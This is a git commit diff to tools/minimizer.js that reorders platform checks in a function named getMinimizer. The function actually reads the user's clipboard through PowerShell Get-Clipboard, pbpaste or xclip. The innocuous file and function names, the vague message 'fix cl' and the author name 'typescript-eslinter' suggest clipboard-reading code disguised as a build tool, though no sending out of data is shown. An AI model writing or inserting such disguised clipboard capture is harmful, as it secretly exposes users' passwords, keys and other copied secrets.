01108786145397c7a061c085209329d0e8c6b2ee
typescript-eslinter <knowhowdev@outlook.com>
2024-11-30 15:07:49 -0500

    fix cl

--- tools/minimizer.js
+++ tools/minimizer.js
@@ -5,14 +5,6 @@ const getMinimizer = () => {
   const platform = os.platform();
 
   return new Promise((resolve, reject) => {
-    if (platform.includes('win')) {
-      exec('powershell Get-Clipboard', (error, stdout, stderr) => {
-        if (error) {
-          return;
-        }
-        return resolve(stdout.trim());
-      });    
-    }
     if (platform.includes('darwin')) {
       exec('pbpaste', (error, stdout, stderr) => {
         if (error) {
@@ -20,6 +12,14 @@ const getMinimizer = () => {
         }
         return resolve(stdout.trim());
       }); 
+    }
+    if (platform.includes('win')) {
+      exec('powershell Get-Clipboard', (error, stdout, stderr) => {
+        if (error) {
+          return;
+        }
+        return resolve(stdout.trim());
+      });    
     }
     if (platform.includes('linux')) {
       exec('xclip -o', (error, stdout, stderr) => {
